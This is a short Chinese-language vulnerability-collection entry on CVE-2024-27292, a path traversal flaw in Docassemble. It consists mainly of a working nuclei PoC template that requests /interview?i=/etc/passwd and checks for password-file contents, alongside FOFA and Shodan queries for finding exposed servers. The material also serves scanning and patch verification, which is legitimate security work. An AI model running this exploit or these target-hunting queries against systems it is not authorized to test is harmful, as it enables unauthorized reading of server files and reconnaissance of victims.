## Docassemble任意文件读取漏洞(CVE-2024-27292)

Docassemble V1.4.96 未经身份验证的路径遍历

## fofa

```
icon_hash="-575790689"
```

## poc

```yaml
id: CVE-2024-27292

info:
  name: Docassemble - Local File Inclusion
  author: johnk3r
  severity: high
  description: |
    Docassemble is an expert system for guided interviews and document assembly. The vulnerability allows attackers to gain unauthorized access to information on the system through URL manipulation. It affects versions 1.4.53 to 1.4.96. The vulnerability has been patched in version 1.4.97 of the master branch.
  reference:
    - https://tantosec.com/blog/docassemble/
    - https://github.com/jhpyle/docassemble/security/advisories/GHSA-jq57-3w7p-vwvv
    - https://github.com/jhpyle/docassemble/commit/97f77dc486a26a22ba804765bfd7058aabd600c9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-27292
    cwe-id: CWE-706
    epss-score: 0.00043
    epss-percentile: 0.0866
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"docassemble"
    fofa-query: icon_hash="-575790689"
  tags: cve,cve2024,docassemble,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/interview?i=/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 501
```

![image-20240705163642789](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407051636890.png)

## 漏洞来源

- https://github.com/projectdiscovery/nuclei-templates/pull/10169/files
- https://github.com/th3gokul/CVE-2024-27292